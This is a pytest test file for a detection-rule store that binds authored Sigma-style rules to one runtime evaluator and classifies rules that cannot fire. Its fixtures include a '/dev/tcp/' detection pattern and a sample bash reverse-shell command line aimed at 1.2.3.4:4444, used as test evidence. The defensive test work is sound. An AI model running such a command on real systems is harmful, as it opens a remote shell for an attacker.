"""P0-F.3 · the authored rule store bound to the ONE runtime evaluator.

These tests guard the boundary as much as the behaviour: binding authored
content must never introduce a second evaluator, and a rule must never be
reported as runtime-active unless it genuinely can fire.
"""
from __future__ import annotations

import pytest

from detection_content import rule_store_binding as rsb
from detection_content.rule_store_binding import (_Binding, _literal,
                                                  _selection_fields,
                                                  evaluate_store_rules,
                                                  flatten_for_sigma)

_LINUX = {"category": "process_creation", "product": "linux"}


def _doc(**over):
    d = {"id": "det_t1", "upstream_id": "t_rule", "title": "T",
         "license_policy_state": "PERMITTED", "state": "VALIDATED",
         "enabled": "True", "level": "high", "logsource": _LINUX,
         "attack_techniques": "['T1071']",
         "detection": {"selection": {"CommandLine|contains": "/dev/tcp/"},
                       "condition": "selection"}}
    d.update(over)
    return d


def _ep(cmd="/bin/bash -c exec 3<>/dev/tcp/1.2.3.4/4444",
        image="/usr/bin/bash"):
    return {"source_vendor": "NivXForge", "source_product": "LinuxSensor",
            "process": {"executable_path": image, "name": "bash",
                        "command_line": cmd}}


def test_a_valid_authored_rule_binds_to_the_existing_evaluator():
    b = _Binding(_doc())
    assert b.state == "BOUND"
    assert b.as_dict()["runtime_evaluator"] == rsb.RUNTIME_EVALUATOR_ID
    # A stable Sigma identity is DERIVED from the store id, never random.
    assert b.sigma_id == _Binding(_doc()).sigma_id


@pytest.mark.parametrize("over,state", [
    ({"license_policy_state": "BLOCKED"}, "LICENSE_BLOCKED"),
    ({"state": "LICENSE_BLOCKED"}, "NOT_VALIDATED"),
    ({"enabled": "False"}, "DISABLED"),
    ({"detection": {}}, "STORE_CONTENT_INCOMPLETE"),
    ({"logsource": {}}, "STORE_CONTENT_INCOMPLETE"),
    ({"logsource": {"product": "windows", "category": "process_creation"}},
     "NO_TELEMETRY"),
    ({"detection": {"keywords": ["something"], "condition": "keywords"}},
     "UNSUPPORTED_BY_EVALUATOR"),
    ({"detection": {"selection": {"c-useragent|contains": "x"},
                    "condition": "selection"}}, "NO_TELEMETRY"),
])
def test_every_unusable_rule_is_classified_and_never_silently_active(over,
                                                                    state):
    b = _Binding(_doc(**over))
    assert b.state == state, b.reason
    assert b.reason, "a rule that cannot fire must say why"
    assert b.as_dict()["runtime_evaluator"] is None


def test_a_rule_that_cannot_fire_is_a_gap_not_a_pass():
    b = _Binding(_doc(logsource={"product": "windows",
                                 "category": "process_creation"}))
    assert "visibility gap" in b.reason


def test_flattening_omits_evidence_that_was_never_observed():
    flat = flatten_for_sigma(_ep(cmd=None))
    assert "CommandLine" not in flat
    assert flat["Image"] == "/usr/bin/bash"
    assert flatten_for_sigma({}) == {}


def test_selection_fields_are_extracted_with_modifiers_stripped():
    assert _selection_fields(
        {"selection": {"Image|endswith": "x", "CommandLine|contains": ["a"]},
         "condition": "selection"}) == {"Image", "CommandLine"}


def test_the_store_repr_round_trip_is_handled():
    assert _literal("['T1027', 'T1059.001']") == ["T1027", "T1059.001"]
    assert _literal("{'category': 'proxy'}") == {"category": "proxy"}
    assert _literal({"a": 1}) == {"a": 1}
    assert _literal("not-a-literal") == "not-a-literal"


def test_a_windows_authored_rule_never_judges_linux_evidence(monkeypatch):
    win = _Binding(_doc(logsource={"product": "windows",
                                   "category": "process_creation"}))
    # Force it BOUND to prove the EVALUATION-time product gate too, not
    # just the binding-time one.
    win.state = "BOUND"
    monkeypatch.setattr(rsb, "load_bindings", lambda force=False: [win])
    assert evaluate_store_rules(_ep()) == []


def test_a_bound_authored_rule_matches_real_evidence_shape(monkeypatch):
    b = _Binding(_doc())
    monkeypatch.setattr(rsb, "load_bindings", lambda force=False: [b])
    hits = evaluate_store_rules(_ep())
    assert [h["rule_id"] for h in hits] == ["det_t1"]
    # Same match shape as the in-code library, so downstream IUE/VEEE
    # cannot tell the two content origins apart.
    assert hits[0]["severity"] == "high"
    assert hits[0]["mitre_attack"] == ["T1071"]
    assert hits[0]["content_origin"] == "authored_store"
    # And it does not fire on evidence that lacks the behaviour.
    assert evaluate_store_rules(_ep(cmd="ls -la")) == []


def test_binding_report_accounts_for_every_stored_rule():
    rep = rsb.binding_report()
    assert rep["authored_rules"] == sum(rep["by_binding_state"].values())
    assert rep["runtime_evaluator"] == rsb.RUNTIME_EVALUATOR_ID
    assert rep["evaluated_at_runtime"] == rep["by_binding_state"].get(
        "BOUND", 0)
    assert all(r["reason"] for r in rep["rules"])


def test_no_second_evaluator_was_introduced():
    import inspect
    src = inspect.getsource(rsb)
    # The binding must call the EXISTING evaluator and parser only.
    assert "from .nivxray_native_sigma import evaluate as nx_evaluate" in src
    assert "from .sigma_strict import strict_parse" in src
    assert "def evaluate(" not in src, "no local evaluator may be defined"
